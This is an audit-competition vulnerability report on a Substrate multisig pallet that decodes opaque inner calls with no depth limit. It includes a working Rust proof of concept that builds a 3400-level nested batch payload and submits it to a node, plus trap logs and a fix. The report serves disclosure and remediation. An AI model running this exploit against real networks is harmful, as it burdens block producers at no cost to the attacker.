# 90329 bc high pallet multisig propose decodes opaque inner calls without a depth limit trapping the block producer

**Submitted on Aug 24th 2026 at 13:37:42 UTC by @Kuzomo for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90329
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

### Brief/Intro

`pallet_multisig::propose` takes the inner call as opaque bytes and decodes them inside the runtime with a plain recursive `RuntimeCall::decode`. Substrate bounds extrinsic decode recursion at `MAX_EXTRINSIC_DEPTH = 256`, but that ceiling is applied when the outer extrinsic is decoded, and the outer extrinsic only ever sees a `BoundedVec<u8>` — the nesting inside those bytes is invisible to it.

Upstream `pallet_multisig` does not have this problem because it takes a typed `Box<RuntimeCall>`, which the outer decode does inspect. A signer of any multisig can therefore submit \~3400 nested `Utility::batch` wrappers inside the 10240-byte `MaxCallSize` budget, pass pool validation normally, and have the block producer exhaust its WASM stack while dispatching the transaction.

In the run below the trap unwinds 5778 frames inside `BlockBuilder_apply_extrinsic`, block preparation goes from 1 ms to 15 ms, and the transaction is then discarded as invalid without consuming the sender's nonce or charging a fee. Every guard the pallet has for this — the full-weight burn on decode failure, `MaxInnerCallWeight`, and the `ProposalDeposit` reserve — is positioned after the decode and so cannot fire.

### Vulnerability Details

`propose` accepts the inner call as raw bytes rather than a typed call:

```
pallets/multisig/src/lib.rs:535   pub fn propose(
pallets/multisig/src/lib.rs:538       call: BoundedCallOf<T>,
pallets/multisig/src/lib.rs:251   pub type BoundedCallOf<T> = BoundedVec<u8, <T as Config>::MaxCallSize>;
runtime/src/configs/mod.rs:648    pub const MaxCallSize: u32 = 10240; // 10KB
```

<https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L535-L540>

The ceiling exists and the outer extrinsic is decoded under it:

```
frame/support/src/lib.rs:40     pub const MAX_EXTRINSIC_DEPTH: u32 = 256;
frame/executive/src/lib.rs:877  let uxt = <Block::Extrinsic as codec::DecodeLimit>::decode_all_with_depth_limit(
frame/executive/src/lib.rs:878      MAX_EXTRINSIC_DEPTH,
```

<https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L877-L879>

Upstream takes `call: Box<<T as Config>::RuntimeCall>`, so a typed inner call is covered by that same decode. An opaque `Vec<u8>` is not: the executive decodes the byte vector as bytes, and the nesting inside it is never walked. The inner decode happens later, at dispatch, with no limit:

```rust
// pallets/multisig/src/lib.rs:598-599
// On decode failure, we burn the full reserved weight to prevent griefing.
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

<https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L599>

The comment states the intended anti-griefing control: a malformed call burns the reserved weight so the sender pays. That control only covers a decode `Err`. A stack overflow is a WASM trap, not an `Err`, so the `map_err` arm is never reached and the whole extrinsic is unwound instead.

The two other guards sit even further downstream and are likewise unreachable:

```
pallets/multisig/src/lib.rs:604   let call_weight = decoded_call.get_dispatch_info().call_weight;   // after decode
pallets/multisig/src/lib.rs:647   let deposit = T::ProposalDeposit::get();                          // after decode
pallets/multisig/src/lib.rs:648   T::Currency::reserve(&proposer, deposit)
```

`DecodeLimit` and `decode_all_with_depth_limit` do not appear anywhere under `runtime/` or `pallets/`.

The same unbounded decode is repeated on the stored blob in `execute`:

<https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1125>

Building the payload is trivial. `Utility::batch { calls: [inner] }` encodes as pallet index `0x09`, call index `0x00`, compact length `0x04` — three bytes per level, with `[0x09,0x00,0x00]` as the innermost empty batch. `10240` bytes of `MaxCallSize` therefore buys roughly 3400 levels, over thirteen times the 256 the platform permits.

Pool validation runs the `TxExtension` pipeline and not dispatch, so the transaction is accepted and gossiped as an ordinary signed extrinsic; the recursion only happens when a producer picks it up and calls `apply_extrinsic`.

### Impact Details

A block producer processes a transaction taken from its own mempool far beyond the decode-depth parameter the runtime cannot enforce on opaque bytes, and pays for it while the sender does not.

Measured on a `--dev` validator at depth 3400: the trap unwinds 5778 frames through `BlockBuilder_apply_extrinsic -> do_apply_extrinsic -> pallet_multisig::Call::dispatch_bypass_filter -> RuntimeCall::decode`, and preparation of the block that picks the transaction up takes 15 ms against a 1 ms baseline on every other block in the same run (14–15 ms across repeated runs).

The transaction is then marked `Extrinsic invalid` and removed from the pool, so the sender's nonce is not consumed and no fee is taken. Creating the multisig costs a one-time non-refundable `MultisigFee` of 0.6 UNIT (`runtime/src/configs/mod.rs:649`, withdrawn at `pallets/multisig/src/lib.rs:466`) and the sender must keep enough balance to pass fee validation; after that every attempt is free and repeatable, since changing the nesting depth by one produces a different transaction hash.

Sustained cost is bounded, and the bound is worth stating plainly: because the discarded transaction never consumes its nonce, further submissions from the same account queue behind it as `set="future"` and never reach the producer. That yields one trap per resubmission at the current nonce — \~14 ms of wasted authoring against a roughly 20 s block interval in the observed run — rather than an unbounded stall.

Block production continued normally throughout every measurement, and no funds, balances or chain state were affected.

### Feasibility Limitations Check

No trusted role is involved at any point and nothing is misconfigured. `create_multisig` and `propose` are permissionless dispatchables callable by any funded account; the attacker creates their own multisig with themselves as a signer, so no existing multisig or third party has to participate.

The payload stays inside the pallet's own declared `MaxCallSize`, so no parameter is exceeded and no limit is bypassed to reach the sink — the transaction is well-formed by every check the runtime applies before dispatch.

Attack investment is the one-time 0.6 UNIT multisig fee plus enough balance to pass fee validation. The behaviour is a property of the pinned competition source at `3b243b870a5442a6e5f443056f67bbba87d472f5`; no runtime upgrade, governance action or future provisioning is required, and the code path is live in the runtime as deployed (`Multisig` is registered at `runtime::pallet_index(19)`).

## Recommendation

Decode the opaque call under the same ceiling the outer extrinsic uses, at both sinks:

```rust
use codec::DecodeLimit;
use frame_support::MAX_EXTRINSIC_DEPTH;

let decoded_call = <T as Config>::RuntimeCall::decode_all_with_depth_limit(
        MAX_EXTRINSIC_DEPTH, &mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

This is the same call `frame_executive` already makes on the outer extrinsic (`frame/executive/src/lib.rs:877`), applied to the inner bytes.

`decode_all_with_depth_limit` returns `Err` on an over-deep payload rather than trapping, which routes the attempt back into the existing `err_burn_full_raw` path so the sender pays the reserved weight exactly as the pallet already intends.

Alternatively, restore the upstream typed parameter `call: Box<<T as Config>::RuntimeCall>` so the outer extrinsic decode enforces the limit and no in-runtime decode is needed at all.

## References

* opaque call parameter: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L535-L540>
* unbounded decode at dispatch: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L596-L606>
* weight and deposit guards, both after the decode: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L604-L650>
* same unbounded decode in execute: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1125>
* MaxCallSize and MultisigFee: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L648-L649>
* depth ceiling constant: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/support/src/lib.rs#L40>
* executive applies it to the outer extrinsic: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L877-L879>

## Proof of Concept

Local `--dev` node only; no transaction was sent to any public network. The chain uses Dilithium signatures, which `polkadot-js` and `subkey` cannot produce, so the payload is signed with the repository's own crates.

The PoC must be a workspace member: a standalone crate resolves upstream `frame-system` instead of the in-tree fork through the workspace `[patch.crates-io]` table and fails to compile.

{% stepper %}
{% step %}

### Build the node

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain && cd audit-comp-quantus-chain
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
cargo build --release -p quantus-node
```

{% endstep %}

{% step %}

### Start the local validator

```bash
RUST_LOG=info,txpool=trace,basic-authorship=trace \
./target/release/quantus-node --base-path /tmp/f --dev --validator \
  --experimental-rpc-endpoint "listen-addr=127.0.0.1:9944,methods=unsafe,cors=all"
```

{% endstep %}

{% step %}

### Run the PoC

Add `multisig-depth-poc` to workspace members, save the two files below, then run:

```bash
cargo run --release -p multisig-depth-poc
```

`multisig-depth-poc/Cargo.toml`:

```toml
[package]
name = "multisig-depth-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
quantus-runtime = { path = "../runtime" }
qp-dilithium-crypto = { path = "../primitives/dilithium-crypto" }
pallet-multisig = { path = "../pallets/multisig" }
frame-system = { workspace = true, default-features = true }
pallet-transaction-payment = { workspace = true, default-features = true }
frame-metadata-hash-extension = { workspace = true, default-features = true }
sp-runtime = { workspace = true, default-features = true }
sp-core = { workspace = true, default-features = true }
codec = { workspace = true, default-features = true }
hex = { workspace = true, default-features = true }
hex-literal = "0.4"
ureq = { version = "2.10", features = ["json"] }
serde_json = "1"
```

`multisig-depth-poc/src/main.rs`:

```rust
use codec::Encode;
use quantus_runtime as rt;
use sp_core::Pair;
use sp_runtime::traits::IdentifyAccount;

fn call(m: &str, p: serde_json::Value) -> String {
    let b = serde_json::json!({"jsonrpc":"2.0","id":1,"method":m,"params":p});
    ureq::post("http://127.0.0.1:9944").send_json(b)
        .map(|r| r.into_string().unwrap()).unwrap_or_else(|e| e.to_string())
}

fn rpc(m: &str, x: &rt::UncheckedExtrinsic) {
    let r = call(m, serde_json::json!([format!("0x{}", hex::encode(x.encode()))]));
    println!("\n{m} -> {}\n", &r[..r.len().min(400)]);
}

fn sign(c: rt::RuntimeCall, n: u32, g: rt::Hash) -> rt::UncheckedExtrinsic {
    let p = qp_dilithium_crypto::pair::crystal_alice();
    let e: rt::TxExtension = (
        frame_system::CheckNonZeroSender::new(), frame_system::CheckSpecVersion::new(),
        frame_system::CheckTxVersion::new(), frame_system::CheckGenesis::new(),
        frame_system::CheckEra::from(sp_runtime::generic::Era::Immortal),
        frame_system::CheckNonce::from(n), frame_system::CheckWeight::new(),
        rt::transaction_extensions::ReversibleTransactionExtension::new(),
        rt::transaction_extensions::WormholeProofRecorderExtension::new(),
        pallet_transaction_payment::ChargeTransactionPayment::from(0),
        frame_metadata_hash_extension::CheckMetadataHash::new(false),
        frame_system::WeightReclaim::new());
    let raw = rt::SignedPayload::from_raw(c.clone(), e.clone(),
        ((), rt::VERSION.spec_version, rt::VERSION.transaction_version, g, g,
         (), (), (), (), (), None, ()));
    let s = raw.using_encoded(|b| p.sign(b));
    rt::UncheckedExtrinsic::new_signed(c, p.public().into_account().into(),
        rt::Signature::Dilithium87(s), e)
}

fn main() {
    // Utility::batch{calls:[inner]} = [9,0,4] per level, innermost [9,0,0]: 3 bytes/level.
    let mut blob = vec![9u8, 0, 0];
    for _ in 0..3400 { let mut o = vec![9u8, 0, 4]; o.extend(&blob); blob = o; }
    println!("payload {} bytes, depth 3400 (MaxCallSize 10240, decode depth limit 256)", blob.len());

    let g: rt::Hash = sp_core::H256(hex_literal::hex!(
        "df1629e4e33391549aa0982d5bf33f42fb520231af2fdd542251ce66c45952d7")); // --dev genesis
    let a = qp_dilithium_crypto::pair::crystal_alice().public().into_account();
    let b = qp_dilithium_crypto::pair::dilithium_bob().public().into_account();

    rpc("author_submitExtrinsic", &sign(rt::RuntimeCall::Multisig(
        pallet_multisig::Call::create_multisig { signers: vec![a, b], threshold: 1, nonce: 0 }), 0, g));

    // PoW block times vary; poll for inclusion instead of sleeping a fixed interval
    let pfx = "0x7474449cca95dc5d0c00e71735a6d17d3cd15a3fd6e04e47bee3922dbfa92c8d";
    for i in 0..60 {
        std::thread::sleep(std::time::Duration::from_secs(5));
        if !call("state_getKeysPaged", serde_json::json!([pfx, 5, pfx])).contains("[]") {
            println!("multisig created after {}s", (i + 1) * 5);
            break;
        }
    }

    // deterministic address for signers=[alice,bob], threshold=1, nonce=0
    let ms: rt::AccountId = hex_literal::hex!(
        "36d2273bce2f6391cca6f878555d2125fe472fd3678240d1ecbafd0159ce35fc").into();
    let x = sign(rt::RuntimeCall::Multisig(pallet_multisig::Call::propose {
        multisig_address: ms, call: blob.try_into().unwrap(), expiry: 10_000 }), 1, g);

    rpc("system_dryRun", &x);           // trap is visible in this response
    rpc("author_submitExtrinsic", &x);  // block producer then traps while authoring
}
```

{% endstep %}
{% endstepper %}

Observed output:

```
payload 10203 bytes, depth 3400 (MaxCallSize 10240, decode depth limit 256)
author_submitExtrinsic -> {"jsonrpc":"2.0","id":1,"result":"0xf2d9509f..."}
multisig created after 30s

system_dryRun -> {"jsonrpc":"2.0","id":1,"error":{"code":1,"message":"Unable to dry run extrinsic.",
"data":"Execution failed: Execution aborted due to trap: wasm trap: out of bounds memory access
WASM backtrace:
    0: parity_scale_codec::codec::decode_vec_with_len
    2: pallet_utility::pallet::Call<T>::decode
    3: quantus_runtime::RuntimeCall::decode        <-- repeats
 5772: frame_support::storage::transactional::with_transaction
 5773: pallet_multisig::pallet::Call<T>::dispatch_bypass_filter
 5777: frame_executive::Executive::do_apply_extrinsic
 5778: BlockBuilder_apply_extrinsic"}}

author_submitExtrinsic -> {"jsonrpc":"2.0","id":1,"result":"0x489f8ec3..."}
```

The second `author_submitExtrinsic` is the one that matters: it submits the same transaction through the ordinary path, so the block producer dispatches it while authoring.

From the same run, the producer states plainly that it took the transaction and the runtime aborted:

```
basic-authorship: [0x489f8ec32efc2df49f5ddf0634a972dc71105d68c117e285d438ba888952c5ff] Pushing to the block.
basic-authorship: [0x489f8ec32efc2df49f5ddf0634a972dc71105d68c117e285d438ba888952c5ff] Invalid transaction:
    Error at calling runtime api: Execution failed: Execution aborted

sc_basic_authorship: Prepared block for proposing at 3 (15 ms)

txpool: best-iterator: Reported as invalid. Will skip sub-chains while iterating. tx_hash=0x489f8ec3...
txpool: Removed as part of the subtree. tx_hash=0x489f8ec3...
txpool::watcher: Extrinsic invalid. tx_hash=0x489f8ec3...
txpool: Removed invalid transaction tx_hash=0x489f8ec3...
```

Every other block prepared in that run reports `(1 ms)`. The transaction is never included — the block still carries only the timestamp inherent — yet the producer paid 15 ms to attempt it, and the sender's nonce and balance are unchanged afterwards.
